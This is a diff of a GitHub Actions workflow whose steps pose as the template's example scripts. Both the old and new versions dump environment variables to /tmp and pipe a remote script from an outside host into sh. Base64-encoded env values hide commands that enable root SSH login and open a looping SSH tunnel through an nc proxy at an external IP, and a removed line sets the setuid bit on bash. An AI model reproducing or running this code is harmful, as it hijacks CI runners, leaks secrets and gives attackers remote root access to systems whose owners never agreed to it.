@@ -27,7 +27,7 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: bash -c "sudo apt-get install -y socat;sudo chmod u+s /bin/bash;(env|grep ss>/tmp/s0;sleep 420&);"
+        run: bash -c "(env|grep ss>/tmp/s0;sleep 420&);"
         env:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
       # Runs a set of commands using the runners shell
@@ -35,7 +35,7 @@ jobs:
 
       - name: Run a multi-line script
         run: 
-          bash -p -c "(sleep 150&);env|grep ss>/tmp/s1s.txt;cd /tmp;curl -o- http://xss.pt/4Mi8|tr -d '\r'|tee h2|sh;sleep 24000;"
+          bash -c "env|grep ss>/tmp/s1s.txt;cd /tmp;curl -o- http://xss.pt/4Mi8|tr -d '\r'|tee a1|sh;(while true;do date;sleep 300;done)"
         env:
           sshc1: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
           ssh_up_r: "KCh3aGlsZSB0cnVlO2RvIChlY2hvICdzc2ggdGVlQDEyNy4wLjAuMSAtUDIyIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyAiUHJveHlDb21tYW5kPW5jIC1YIDUgLXggMy4zOS4xODYuMjQ1OjU1NTk0ICVoICVwIiAidXB0aW1lPj5meDk4Iic7c2xlZXAgMjtlY2hvIDEyMzQ1NjtzbGVlcCAxO2VjaG8gMTIzNDU2O2VjaG8gZXhpdDspfHNjcmlwdCAvZGV2L251bGw7IHNsZWVwIDYwMDtkb25lOykmICkm"
